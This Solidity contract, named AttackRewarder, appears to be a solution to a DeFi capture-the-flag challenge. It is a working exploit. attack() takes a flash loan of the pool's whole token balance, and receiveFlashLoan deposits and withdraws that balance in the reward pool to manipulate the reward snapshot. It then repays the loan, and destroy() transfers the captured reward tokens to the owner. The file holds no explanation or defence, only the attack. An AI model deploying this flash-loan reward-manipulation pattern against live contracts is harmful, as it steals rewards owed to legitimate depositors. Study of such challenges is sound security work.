pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./FlashLoanerPool.sol";

interface IRewardPool {
    function deposit(uint256) external;
    function withdraw(uint256) external;
    function distributeRewards() external returns (uint256);
}

contract AttackRewarder {
    using SafeMath for uint256;
    using Address for address;

    FlashLoanerPool public pool;
    IRewardPool public rPool;
    IERC20 public aToken;
    IERC20 public rToken;
    address payable private owner;

    modifier onlyPool() {
        require(msg.sender == address(pool), "ZZ");
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "GG");
        _;
    }

    constructor (address _pool, address _rPool, address _aToken, address _rToken) public {
        pool = FlashLoanerPool(_pool);
        rPool = IRewardPool(_rPool);
        aToken = IERC20(_aToken);
        rToken = IERC20(_rToken);
        owner = msg.sender;
    }

    function receiveFlashLoan(uint256 _amount) external onlyPool {
        aToken.approve(address(rPool), _amount);
        rPool.deposit(_amount);
        rPool.withdraw(_amount);
        require(aToken.transfer(address(pool), _amount));
    }

    function destroy() external onlyOwner {
        uint256 amount = rToken.balanceOf(address(this));
        require(rToken.transfer(owner, amount));
    }

    function attack() external onlyOwner {
        uint256 amount = aToken.balanceOf(address(pool));
        pool.flashLoan(amount);
    }

    // Allow deposits of ETH
    receive () external payable {}
}
